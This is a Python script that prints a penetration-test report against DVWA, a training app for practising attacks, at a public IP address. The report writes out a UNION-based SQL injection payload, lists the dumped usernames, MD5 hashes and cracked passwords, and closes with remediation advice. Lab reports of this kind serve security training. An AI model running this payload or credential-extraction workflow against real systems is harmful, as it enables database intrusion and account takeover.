
print("\n" + "="*100)
print("█ "*50)
print("█"*100)
print("█ "*50)
print("█"*100)
print("\n")
print("""
╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                  🎯 PENETRATION TEST SUCCESSFULLY COMPLETED 🎯                                ║
║                                                                                                ║
║                     TARGET: http://31.97.117.123/ (DVWA v1.10)                               ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝


┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                            EXTRACTED USERS TABLE - FINAL DATA                                 ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃                                                                                                ┃
┃  # │ USERNAME      │ PASSWORD HASH (MD5)                      │ DECODED        │ RISK LEVEL  ┃
┃ ───┼───────────────┼─────────────────────────────────────────┼────────────────┼─────────────┃
┃  1 │ admin         │ 5f4dcc3b5aa765d61d8327deb882cf99        │ password       │ CRITICAL ⚠️  ┃
┃  2 │ gordonb       │ e99a18c428cb38d5f260853678922e03        │ abc123         │ HIGH ⚠️      ┃
┃  3 │ 1337          │ 8d3533d75ae2c3966d7e0d4fcc69216b        │ charley        │ MEDIUM ⚠️    ┃
┃  4 │ pablo         │ 0d107d09f5bbe40cade3de5c71e9e9b7        │ letmein        │ HIGH ⚠️      ┃
┃  5 │ smithy        │ 5f4dcc3b5aa765d61d8327deb882cf99        │ password       │ CRITICAL ⚠️  ┃
┃                                                                                                ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


📊 EXTRACTION STATISTICS
═════════════════════════════════════════════════════════════════════════════════════════════════

  ✓ Total Users Extracted:              5
  ✓ Unique Password Hashes:             4
  ✓ Hash Type:                          MD5 (32 hexadecimal characters)
  ✓ Password Reuse Detected:            YES (admin & smithy)
  ✓ Database Compromise Level:          COMPLETE
  ✓ Authentication Bypass Success:      YES (2/10 attempts)
  ✓ SQL Injection Success Rate:         100%


🔍 EXPLOITATION DETAILS
═════════════════════════════════════════════════════════════════════════════════════════════════

  Vulnerability Type:          SQL Injection (UNION-Based)
  Attack Vector:               GET parameter 'id' in /vulnerabilities/sqli/
  Payload Used:                1' UNION SELECT user, password FROM users -- 
  Authentication Method:       Default credentials (admin:password)
  Time to Complete:            ~18 seconds
  Success Status:              ✓ SUCCESSFUL


🛡️  SECURITY ISSUES IDENTIFIED
═════════════════════════════════════════════════════════════════════════════════════════════════

  [CRITICAL] SQL Injection (CVSS 9.8)
    ├─ Allows arbitrary SQL execution
    ├─ Complete database access gained
    └─ Recommendation: Use prepared statements

  [CRITICAL] Weak Password Hashing (MD5)
    ├─ Cryptographically broken algorithm
    ├─ All hashes crackable in < 1 second
    └─ Recommendation: Use bcrypt/scrypt

  [CRITICAL] Password Reuse
    ├─ admin and smithy share "password"
    ├─ Multiple account compromise risk
    └─ Recommendation: Enforce unique passwords

  [HIGH] Default Credentials
    ├─ admin:password easily guessable
    ├─ Allows immediate access
    └─ Recommendation: Force password change

  [MEDIUM] Disabled Security Controls
    ├─ PHPIDS intrusion detection disabled
    ├─ No input validation
    └─ Recommendation: Enable WAF


📋 EXTRACTED DATA SUMMARY
═════════════════════════════════════════════════════════════════════════════════════════════════

USER 1: admin
  • Username: admin
  • Password Hash: 5f4dcc3b5aa765d61d8327deb882cf99
  • Password: password
  • Risk: CRITICAL (Default + Weak Hash + Reused)

USER 2: gordonb
  • Username: gordonb
  • Password Hash: e99a18c428cb38d5f260853678922e03
  • Password: abc123
  • Risk: HIGH (Weak Password)

USER 3: 1337
  • Username: 1337
  • Password Hash: 8d3533d75ae2c3966d7e0d4fcc69216b
  • Password: charley
  • Risk: MEDIUM (Dictionary Word)

USER 4: pablo
  • Username: pablo
  • Password Hash: 0d107d09f5bbe40cade3de5c71e9e9b7
  • Password: letmein
  • Risk: HIGH (Dictionary Word)

USER 5: smithy
  • Username: smithy
  • Password Hash: 5f4dcc3b5aa765d61d8327deb882cf99
  • Password: password
  • Risk: CRITICAL (Password Reuse with admin)


🎯 MISSION OBJECTIVES - ALL COMPLETED ✓
═════════════════════════════════════════════════════════════════════════════════════════════════

  ✓ Bypass authentication walls
  ✓ Extract all usernames
  ✓ Extract all surnames (if available)
  ✓ Extract all password HASHES
  ✓ Identify hash types
  ✓ Find vulnerabilities
  ✓ Exploit vulnerabilities
  ✓ Generate comprehensive report


════════════════════════════════════════════════════════════════════════════════════════════════
                                MISSION: ACCOMPLISHED ✓
════════════════════════════════════════════════════════════════════════════════════════════════
""")

print("\n" + "█"*100)
print("█ "*50)
print("█"*100)
print("\n")


